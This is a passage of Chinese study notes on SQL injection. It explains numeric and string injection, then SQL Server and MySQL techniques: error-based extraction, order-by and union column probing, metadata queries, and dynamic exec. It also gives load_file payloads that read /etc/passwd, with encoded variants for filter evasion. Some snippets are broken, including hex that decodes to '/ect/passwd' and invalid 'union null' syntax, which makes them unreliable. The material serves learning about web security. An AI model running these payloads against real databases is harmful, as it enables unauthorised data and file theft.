## SQL注入漏洞





### 1. 注入原理

白话解释，就是注入语句带进了SQL查询语句处理。

定义就是： **用户输入的数据被SQL 解释器执行**。



### 2. 注入漏洞分类



#### 2.1 数字型注入

当输入的参数为**整型**，如：ID，年龄，页码等，且存在注入漏洞，则认为是存在数字型注入。

一般判断流程：

- 对查询内容加上`'`,因为符号不成对匹配，所以不能正确查询数据，页面也定会报错
- 加上`and 1=1`,如果是数字型则等于直接对查询语句进行拼接，并且是与语句，和原来输入没有差别
- 加上`and 1=2`,页面没有报错，但是条件为假无法查出数据，和原来页面有差别。



强类型和弱类型语言在注入时候区别？



#### 2.2 字符型注入

输入参数为字符串时，称为字符型。

字符型和数字型区别在于，字符型注入一般需要单引号闭合

**字符型注入最关键的是如何闭合SQL语句以及注释多余的代码**



#### 2.3 SQL注入分类

按照对输入数据的分类，那么SQL注入只分为`字符型`和`数字型`，而其他的类似POST注入，盲注，演示注入，也是基于上面两种的不同展现形式和不同位置的展现。

**这里详细展开需要看暗月的SQL注入**





### 3. 常见数据库注入

对于大多数数据库而言，SQL注入的原理基本相似，因为每个数据库都遵循一个SQL语法标准。但是个中也有很多细微差别，包括函数、语法等。因此对于不同的数据库的注入，也不尽相同。

SQL注入利用方式分类：

- 查询数据
- 读写文件
- 执行命令



#### 3.1 SQL Server

##### 1. 利用错误信息提取信息

SQL Server会准备的抛出错误信息。

###### （1）枚举当前表和列

使用`having`字句进行查询。

###### （2）利用数据类型错误提取数据

利用字符串与非字符串比较，或者将字符串转换成另一个不兼容类型时，SQL会抛出异常。

```mysql
select*from users where username='root' and password ='root' and 1> (select top 1 username from users)
```



##### 2. 获取元数据

SQL Server提供了大量视图，便于取得元数据。使用`information_schema.tables`,`informatioin_columns`，表名，列名等。

一些常用的表示图：

- sys.databases: SQL Server中的所有数据库
- sys.sql_logins:SQL Server中所有登录名
- Information_schema.tables:当前数据库中的表
- Information_schema.columns:当前数据库中的列
- sys.all_columns: 用户定义对象和系统对象的所有列的联合
- sys.database_principals:数据库中每个权限或列异常权限
- sys.database_files:存储在数据库中的数据库文件
- Sys objects:数据库中创建的额每个对象



##### 3. Order by字句

`order by` 字句：为SELECT查询的列排序，如果同时指定了`TOP`关键字，则`order by`在视图、内联函数、派生表和子查询中无效。

通常会使用`order by`语句来判断表中列数。

```sql
select id,username,password from users where id = 1
// 按第一列排序
select id,username,password from users where id = 1 order by 1
// 按第二列排序
select id,username,password from users where id = 1 order by 2
// 按第三列排序
select id,username,password from users where id = 1 order by 3
```

如果那行排序抛出错误，那么就是就能得到表列数。



##### 4. Union查询

`Union`关键字将两个或更多个查询结果组合为单个结果集。

###### （1）联合查询探测字段数

```sql
select id,username,password from users where id = 1 union null
union null,null
union null,null,null
```

也可以使用`union 1,2,3`但是这种**可能存在类型兼容问题**。

###### （2）联合查询敏感信息

```sql
// 如果知道列数为3
id = 5 union select 'x',null,null from sysobject where xtype="U"
id = 5 union select null,'x',null from sysobject where xtype="U"
id = 5 union select null,null,'x' from sysobject where xtype="U"
```

如果语句能正常执行，则证明数据类型兼容，就可以把x替换成SQL语句，查询敏感信息。

**这里提供了整型注入变成字符型注入的思路**



##### 5. 无辜的函数

SQL Server提供了非常多的系统函数，利用这些系统函数可以反问SQL Server系统中的信息，而不需要使用SQL语句查询。

SQL Server常用函数表：

|       函数       | 说明                                                     |
| :--------------: | -------------------------------------------------------- |
|      Stuff       | 字符串截取函数                                           |
|      ascii       | 取ASCII码                                                |
|       char       | 根据ACII码取字符                                         |
|     getdate      | 返回日期                                                 |
|      count       | 返回组中总条数                                           |
|       case       | 将一种数据类型的表达式显式转换为另一个种数据类型的表达式 |
|       rand       | 返回随机值                                               |
| is_srvrolemember | 登录名是否为指定服务器角色的成员                         |

|       @@version       | 查看数据库版本                   |
| :-------------------: | -------------------------------- |
|      suser_name       | 返回用户的登录标识名             |
|       user_name       | 基于指定的标识号返回数据库用户名 |
|        db_name        | 返回数据库名称                   |
| is_member('db_owner') | 是否为数据库角色                 |
|   convert(int,'5')    | 数据类型转换                     |
|                       |                                  |
|                       |                                  |
|                       |                                  |



##### 6. 危险的存储过程

存储过程(Stored Procedure)是在大型数据库系统中为了完成特定功能的一组SQL“函数”，如执行系统命令，查看注册表，读取磁盘目录等。



##### 7. 动态执行

SQL Server支持动态执行语句，用户可以提交一个字符串来执行SQL语句。例如：

```sql
exec('select username,password from users')
exec('select' + 't username,password fro' + 'm users')
```

还能通过定义十六进制的SQL语句，使用exec函数执行。



#### 2. MySQL



##### 1. MySQL中的注释

有3种注释风格：

- #：注释从#到行尾
- --：注释从--序列到行位。但是需要在--后面跟一个或多个空格或者tag
- /* */:和c一样

**其中特别注意**

```mysql
select id /*!55555, username*/ from users	
```

注释没有生效，语句被正常执行。这里的`/*!*/`的感叹号是有特殊意义，若MySQL版本号高于或者等于5.55.55语句会被执行。如果感叹号后不加版本号，则直接执行。

##### 2. 获取元数据

MySQL 5.0及其以上版本提供了`information_schema`,`information_schema`是信息数据库。

```mysql
// 查询数据库名称,information_schema.schemata表中找出
select schema_name from information_schema.schemata limit 0,1
// 查询数据库表
select table_name from information_schema.tables where table_schema=database() limit 0,1
// 查询表所有字段
select column_name from information_schema.columns where table_name='' limit 0,1
```

##### 3. Union查询

官方解释Union查询用于把来自许多SELECT语句的结果组合到一个结果集合中，且每列的数据类型必须相同

MySQL中，列类型不确定的时候，也能执行正确？

##### 4. MySQL函数利用

###### （1）load_file()函数读写操作

`load_file`函数能快速读取文件，但是文件位置必须在服务器上，要以绝对路径获取，而且用户要有`FILE`权限，文件容量也必须小于`max_allowed_packet`字节（默认16MB，最大1GB）

```mysql
union select 1,load_file('/etc/passwd'),3 #
// 16进制绕过
union select 1,load_file(0x2F6563742F706173737764),3 #
// 还能使用ascii将数字转回16进制的符号
union select 1,load_file(char(47,101,99,116,47,112,97,115,115,119,100)),3 #
```

###### (2)